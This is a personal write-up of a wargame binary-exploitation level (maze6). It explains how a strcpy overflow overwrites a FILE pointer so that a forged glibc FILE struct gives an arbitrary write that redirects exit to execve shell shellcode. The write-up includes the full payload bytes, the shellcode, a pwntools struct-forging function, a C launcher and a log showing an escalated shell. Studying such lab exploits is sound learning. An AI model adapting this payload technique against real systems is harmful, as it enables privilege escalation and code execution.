Source explaining file structure exploitation! Really helpful. - https://dhavalkapil.com/blogs/FILE-Structure-Exploitation/

That blog also linked this presentation, which explained file structures really well - https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique

and a paper with some explanations based off of some of the slides: 
https://gsec.hitb.org/materials/sg2018/WHITEPAPERS/FILE%20Structures%20-%20Another%20Binary%20Exploitation%20Technique%20-%20An-Jie%20Yang.pdf

Wow... compared to the rest of maze this level is pretty tough!
It leveraged an exploit I had no clue existed, and taught me a lot about how files work in C.

If we were to rougly recreate the source code, it'd look like this:

                   maze6.c (recreated):
┌─────────────────────────────────────────────────────────────┐
│  int main(int argc, char*[] argv){                          │
│      if(argc != 3){                                         │
│          printf("%s file2write string\n", argv[0]);         │
│          exit(-1);                                          │
│      }                                                      │
│      FILE* fp = fopen(argv[1], "a");                        │
│      if(fp == 0){                                           │
│          perror("fopen");                                   │
│          exit(-1);                                          │
│      }                                                      │
│      char buf[???];                                         │
│      strcpy(buf, argv[2]);                                  │
│      memfrob(buf, strlen(buf));                             │
│      fprintf(fp, "%s : %s\n", argv[1], buf);                │
│      exit(0);                                               │
│  }                                                          │
└─────────────────────────────────────────────────────────────┘

Running the executable with 2 arguments, 'public' and 'TEST', 
this bin will open 'public' and append the string 'public : ~oy~' to the file.

Fortunately since this bin uses strcpy, it has an opportunity for a buffer overflow... however
there isn't any return happening in the main method, only exits.

Unfortunately, this means that we can't just overwrite a return address and hop to shellcode, or a ret2libc.

What we CAN overwrite is the value of fp inside of the stack, allowing us to point the file stream argument of fprintf to wherever we'd like.

Before this level, I had no idea how file structs work, as well as lower level functions for file operations (such as fwrite, fread, fclose, FPRINTF,  etc...).

Because of the way files in C work though, an overwritten file pointer can actually be quite dangerous!

An overwritten file pointer in fprintf that points to a carefully constructed fake file struct can allow for arbitrary memory writing.
In this level, although there is nowhere to *return* to, that allows us to just overwrite the plt location of any function (which is writable, such as exit). 

We can then make exit actually point to shellcode that we put into the file to execve(/bin/sh)!

The question is how?

First - an explanation on the organization of the file struct in C

Although unclear at first, using gdb I printed out the struct dereferenced during valid execution of the binary.
 
                       maze6 valid file struct:
       ┌───────────────────────────────────────────────────┐
       │$fp = {                                            │
       │  _flags           = 0xfbad3484,                   │ //Determines whether to read/write/append, as well as buffer status of file
       │  _IO_read_ptr     = 0x0,                          │ //current location of read buffer
       │  _IO_read_end     = 0x0,                          │ //end of read buffer
       │  _IO_read_base    = 0x0,                          │ //beginning of read buffer
       │  _IO_write_base   = 0x0,                          │ //beginning of write buffer
       │  _IO_write_ptr    = 0x0,                          │ //current location of write buffer
       │  _IO_write_end    = 0x0,                          │ //end of write buffer
       │  _IO_buf_base     = 0x0,                          │ //beginning of reserve buffer
       │  _IO_buf_end      = 0x0,                          │ //end of reserve buffer
       │  _IO_save_base    = 0x0,                          │ 
       │  _IO_backup_base  = 0x0,                          │
       │  _IO_save_end     = 0x0,                          │
       │  _markers         = 0x0,                          │
       │  _chain           = 0xf7f97c40 <_IO_2_1_stderr_>, │ //pointer to chain (file (current location)->stderr->stdout->stdin)
       │  _fileno          = 3,                            │ //file descriptor
       │  _flags2          = 0,                            │
       │  _old_offset      = 0,                            │
       │  _cur_column      = 0,                            │
       │  _vtable_offset   = 0 '\000',                     │
       │  _shortbuf        = "",                           │
       │  _lock            = 0x804a238,                    │ //Prevents fclose if file is locked? Has to be pointed to a null byte
       │  _offset          = -1,                           │
       │  __pad1           = x0,                           │
       │  __pad2           = 0x804a244,                    │
       │  __pad3           = 0x0,                          │
       │  __pad4           = 0x0,                          │
       │  __pad5           = 0,                            │
       │  _mode            = 0,                            │
       │  _unused2         = '\000' <repeats 39 times>     │
       │  _vtable                                          │
       │}                                                  │
       └───────────────────────────────────────────────────┘

Whenever a function like fprintf/fwrite/fclose is called with a filepointer (fp) as an argument,
it accesses the vtable offset, and then dereferences the relevant functions inside of the vtable.

For example, on a call to fread, the program accesses vtable->doallocate, where
doallocate is at a specified offset in the vtable.

This made attacks with a forged/fake vtable effective in the past, because if one knew a function such as fread would be called,
passing in a fake vtable with the pointer to system() in the position of doallocate could be leveraged to net a shell.

Unfortunately, the updated glibc as of version 2.24 now checks that the vtable pointer is legitimate, by ensuring it is within the valid
__libc_IO_vtables section. If not, the program sigaborts.

Regardless, there are valid vtable locations that can be used instead -- such as _IO_file_jumps (https://dhavalkapil.com/blogs/FILE-Structure-Exploitation/).

This vtable is valid, AND contains the function _IO_str_overflow. _IO_str_overflow can be used to write to the location pointed to
by _IO_buf_base, writing (_IO_buf_end-_IO_buf_base) bytes.

The value it writes... honestly I'm not sure where it gets it from. After I set the bytes properly in my test payloads,
it ended up pulling from argv[1]'s first four bytes... so all that has to be set is _IO_buf_base, and _IO_buf_end (which should be _IO_buf_base+7...
it'll write the begging of the format string before it writes the four bytes we want).

So to create the exploit, we'll push multiple items onto the stack with argv[1], overriding the file pointer.

Through a lot of trial and tribulation, I found this order:
┌───────────────────────────────────────────────────────────────────────────────────────┐
│address_of_shellcode + 'TTRASH' + shellcode + 197*'A' + fake_file_address + 12*'A' +   │
│busted_loc_addr + 9*'A' + 'busted\x00' + busted_addr + 'FAKEFILE=' + fake_file + 'tras'│
└───────────────────────────────────────────────────────────────────────────────────────┘

This being the shellcode:
'SHELLCODE=\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x89\xe5\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x8d\x0c\x24\x31\xc0\x50\x51\x8b\x1c\x24\x89\xe1\xb0\x0b\xcd\x80'

and this being the crafted fake file struct (crafted based off of the gdb dereferenced fp output):
'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xd9\x98\x04\x08
\xe0\x98\x04\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
\x00\x00\x00\x00\x40\x7c\xf9\xf7\x00\x00\x00\x00\x00\x00\x00\x00
\x00\x00\x00\x00\x00\x00\x00\x00\x7d\xd0\xff\xff\xff\xff\xff\xff
\xff\xff\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
\x00\x00\x00\x00\x80\x85\xf9\xf7\x74\x72\x61\x73'

or, using python2's version of pwntools 
(idea from https://dhavalkapil.com/blogs/FILE-Structure-Exploitation/):

┌──────────────────────────────────────────────────────────┐
│def forge_file():                                         │
│   #var addresses defined...                              │
│   struct = p32(0x0)                #  _flags             │
│   struct += p32(0x0)               #  _IO_read_ptr       │
│   struct += p32(0x0)               #  _IO_read_end       │
│   struct += p32(0x0)               #  _IO_read_base      │
│   struct += p32(0x0)               #  _IO_write_base     │
│   struct += p32(0x0)               #  _IO_write_ptr      │
│   struct += p32(0x0)               #  _IO_write_end      │
│   struct += p32(writeaddr)         #  _IO_buf_base       │
│   struct += p32(writeend)          #  _IO_buf_end        │
│   struct += p32(0x0)               #  _IO_save_base      │
│   struct += p32(0x0)               #  _IO_backup_base    │
│   struct += p32(0x0)               #  _IO_save_end       │
│   struct += p32(0x0)               #  _markers           │
│   struct += p32(_chain)            #  _chain             │
│   struct += p32(0x0)               #  _fileno            │
│   struct += p32(0x0)               #  _flags2            │
│   struct += p32(0x0)               #  _cur_column        │
│   struct += p32(0x0)               #  _vtable_offset     │
│   struct += p32(_lock)             #  _lock              │
│   struct += p32(0xffffffff)        #  _offset            │
│   struct += p32(0xffffffff)        #  _offset pt 2       │
│   struct += p32(0x0)               #  __pad1             │
│   struct += p32(0x0)               #  __pad2             │
│   struct += p32(0x0)               #  __pad3             │
│   struct += p32(0x0)               #  __pad4             │
│   struct += p32(0x0)               #  __pad5             │
│   struct += p32(0x0)               #  _mode              │
│   struct += '\x00'*40              # _unused             │
│   struct += p32(_vtable)                                 │
│   return struct                                          │
└──────────────────────────────────────────────────────────┘

address_of_shellcode is what will be overwriting exit's address in the procedure linkage table.
'TRASHH'/tras/AAA...AAA/etc are all trash bytes to take up space
fake_file_address is the location after 'FAKEFILE=', which is the address of the forged file struct.
'busted' is provided as an argument for fprintf's '%s'.
'busted_addr' points to that string, and 'busted_loc_addr' acts as a double pointer to 'busted'

Of course, this is all supposed to be passed in as argv[2] - but there are so many null bytes!
Fortunately because the level memfrobs the data, we can still do that anyway... all the null bytes get converted to the * symbol.

So adjusted for the server, with all of the bytes memfrob'd and typed out, this ends up being the complete and total argv[2] payload:

                               maze6 payload bytes:
┌─────────────────────────────────────────────────────────────────────────────────────┐
│"\xb2\xf1\xd5\xd5\x7e\x7e\x6f\x79\x7e\x2a\x79\x62\x6f\x66\x66\x69\x65\x6e\x6f\x17    │
│\x1b\xea\x1b\xf1\x1b\xe3\x1b\xf8\xa3\xcf\x1b\xea\x7a\x42\x05\x05\x59\x42\x42\x05     │
│\x48\x43\x44\xa7\x26\x0e\x1b\xea\x7a\x7b\xa1\x36\x0e\xa3\xcb\x9a\x21\xe7\xaa\x4b     │
│\x4b\x4b\x4b\x48\x4b\x4b\x4b\x49\x4b\x4b\x4b\x4e\x4b\x4b\x4b\x4f\x4b\x4b\x4b\x4c     │
│\x4b\x4b\x4b\x4d\x4b\x4b\x4b\x42\x4b\x4b\x4b\x43\x4b\x4b\x4b\x40\x4b\x4b\x4b\x41     │
│\x4b\x4b\x4b\x46\x4b\x4b\x4b\x47\x4b\x4b\x4b\x44\x4b\x4b\x4b\x45\x4b\x4b\x4b\x5a     │
│\x4b\x4b\x4b\x5b\x4b\x4b\x4b\x58\x4b\x4b\x4b\x59\x4b\x4b\x4b\x5e\x4b\x4b\x4b\x5f     │
│\x4b\x4b\x4b\x5c\x4b\x4b\x4b\x5d\x4b\x4b\x4b\x52\x4b\x4b\x4b\x53\x4b\x4b\x4b\x50     │
│\x4b\x4b\x48\x48\x4b\x4b\x48\x49\x4b\x4b\x48\x4e\x4b\x4b\x48\x4f\x4b\x4b\x48\x4c     │
│\x4b\x4b\x48\x4d\x4b\x4b\x48\x42\x4b\x4b\x48\x43\x4b\x4b\x48\x40\x4b\x4b\x48\x41     │
│\x4b\x4b\x48\x46\x4b\x4b\x48\x47\x4b\x4b\x48\x44\x4b\x4b\x48\x45\x4b\x4b\x48\x5a     │
│\x4b\x4b\x48\x5b\x4b\x4b\x48\x58\x4b\x4b\x48\x59\x4b\x4b\x48\x5e\x4b\x4b\x48\x5f     │
│\x4b\x4b\x48\x5c\x4b\x4b\x48\x5d\x4b\x4b\x48\x52\x4b\x4b\x48\x53\x9f\xf6\xd5\xd5     │
│\x4b\x4b\x4b\x4b\x48\x4b\x4b\x4b\x49\x4b\x4b\x4b\x8e\xf6\xd5\xd5\x41\x41\x41\x41     │
│\x41\x41\x41\x41\x41\x48\x5f\x59\x5e\x4f\x4e\x2a\x8b\xf6\xd5\xd5\x6c\x6b\x61\x6f     │
│\x6c\x63\x66\x6f\x17\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a     │
│\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\xf3\xb2\x2e\x22\xca\xb2\x2e     │
│\x22\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x6a\x56\xd3     │
│\xdd\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x8a\x8a\x2e     │
│\x22\xd5\xd5\xd5\xd5\xd5\xd5\xd5\xd5\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a     │
│\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a     │
│\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a     │
│\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x4a\x13\xd6\xdd\x5e\x58\x4b     │
│\x59"                                                                                │
└─────────────────────────────────────────────────────────────────────────────────────┘

I took those bytes into a wrapper function with a clean environment, and executed it.


┌──────────────────────────────────────────────────────────────────┐
│#define _GNU_SOURCE                                               │
│#include <string.h>                                               │
│#include <unistd.h>                                               │
│                                                                  │
│int main(void) {                                                  │
│	char *environment[1] = {0};                                │
│	char *payload = "..."; //same bytes as above               │
│	char *argv[4] = {"/maze/maze6", "public", payload, 0};     │
│	execve("/maze/maze6", argv, environment);                  │
│}                                                                 │
└──────────────────────────────────────────────────────────────────┘

Uploaded it to the server, compiled, and ran it...
┌──────────────────────────────────────────────────────────────────┐
│maze6@maze:~$ cd /tmp/tald6                                       │
│maze6@maze:/tmp/tald6$ gcc -m32 serverwrapper.c -o wrap; ./wrap   │
│busted : TTEST$ whoami                                            │
│maze7                                                             │
│$ cat /etc/maze_pass/maze7                                        │
│**********                                                        │
│$                                                                 │
└──────────────────────────────────────────────────────────────────┘
And boom! a shell with escalated privileges...

Definitely one of the most complicated binary exploitation levels I've attempted, and it
taught me a lot!

